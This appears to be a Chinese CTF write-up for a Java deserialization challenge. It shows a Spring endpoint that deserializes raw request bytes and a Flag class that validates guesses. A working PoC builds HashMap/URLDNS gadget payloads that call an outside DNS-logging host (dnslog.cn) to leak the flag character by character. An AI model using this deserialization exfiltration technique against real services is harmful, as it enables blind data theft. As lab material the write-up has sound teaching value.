# README

```java
package com.web.simplejava.controller;

import com.web.simplejava.model.Flag;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;


@RestController
public class FlagController {
    @RequestMapping("/")
    public String index() {
        return "ok";
    }

    @RequestMapping("/flag")
    public String getFlag(@RequestBody byte[] bytes) throws IOException, ClassNotFoundException {
        System.out.println(new String(bytes));
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        try {
            Flag flag = (Flag) new ObjectInputStream(byteArrayInputStream).readObject();
            System.out.println(flag);
        }catch (Exception e){
        }
        return "get your flag";
    }
}

```

```java
package com.web.simplejava.model;

import java.io.Serializable;



public class Flag implements Serializable {
    public String flag;
    public static final Flag flagInstance;
    static {
        flagInstance = new Flag("flag{test}");
    }
    public boolean create = true;

    public Flag(String flag) {
        this.flag = flag;
    }

    public Flag() {
    }


    public Flag getFlagInstance(Flag flagTemplate) throws Exception {
            if (create){
            if (!flagInstance.flag.startsWith(flagTemplate.flag)){
                throw new Exception("flag not valid");
            } else {
                return flagTemplate;
            }
        } else {
            return flagInstance;
        }
    }


    private Object readResolve() throws Exception{
        return getFlagInstance(this);
    }
}

```

其实就是反序列化Flag对象，然后盲注flag了。

本来以为直接写个python脚本就可以的了，因为盲注错误的话会抛出异常。

但是试了才发现，try了：

```java
        try {
            Flag flag = (Flag) new ObjectInputStream(byteArrayInputStream).readObject();
            System.out.println(flag);
        }catch (Exception e){
        }
```

所以直接反序列化的话没办法判断。

pom.xml里有个这个：

```java
        <dependency>
            <groupId>com.bishopfox</groupId>
            <artifactId>GadgetProbe</artifactId>
            <version>1.0-SNAPSHOT</version>
        </dependency>
```

查了一下这是用来探测classpath的一个工具，利用HashMap和DNSLOG链。

说白了就是HashMap里面放2入2个对象，1个是我们要探测的类对象，一个是DNSLOG链对象。HashMap的`readObject`的这里：

```java
            for (int i = 0; i < mappings; i++) {
                @SuppressWarnings("unchecked")
                    K key = (K) s.readObject();
                @SuppressWarnings("unchecked")
                    V value = (V) s.readObject();
                putVal(hash(key), key, value, false, false);
            }
```

让要探测的那个类在`i=0`的时候。如果探测的那个类`readObject`失败了，就会抛出异常导致这里无法运行，也就没法`i=1`，进入URLDNS链的触发，产生DNSLOG了。



这个思路也可以应用于本题，因为Flag对象反序列化的时候如果flag盲测粗了也会抛出异常导致后续的DNSLOG链无法触发。

小问题就是这个：

```java
    public String getFlag(@RequestBody byte[] bytes) throws IOException, ClassNotFoundException {

```

入参是`byte[]`，直接拿网上师傅的函数了：

```java
    public static void doGETParam(Object obj) throws Exception{
        URI url = new URI("http://192.168.142.1:8081/flag");

        HttpEntity<byte[]> requestEntity = new HttpEntity<>(SerializeUtil.serialize(obj));
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getStatusCodeValue());
        System.out.println(res.getBody());
    }
```

POC：

```java
    public static void main(String[] args) throws Exception{
        String ss="abcdefghijklmnopqrstuvwsyz1234567890-";
        //String ss="a";
        for (int i=0;i<ss.length();i++){
            char dd=ss.charAt(i);
            Flag a =new Flag("flag{"+dd);
            LinkedHashMap hm = new LinkedHashMap();

            URLStreamHandler handler = new SilentURLStreamHandler();
            URL url = new URL(null,"http://"+dd+ ".ppsujx.dnslog.cn",handler);

            Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
            f.setAccessible(true);

            //f.set(url, 0xdeadbeef);

            hm.put("sie",a);
            hm.put(url, "sie");

            f.set(url, -1);


            doGETParam(hm);

        }
    }
    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }
    public static void doGETParam(Object obj) throws Exception{
        URI url = new URI("http://192.168.142.1:8081/flag");

        HttpEntity<byte[]> requestEntity = new HttpEntity<>(SerializeUtil.serialize(obj));
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> res = restTemplate.postForEntity(url, requestEntity, String.class);
        System.out.println(res.getStatusCodeValue());
        System.out.println(res.getBody());
    }
```

用DNSLOG跑出flag即可。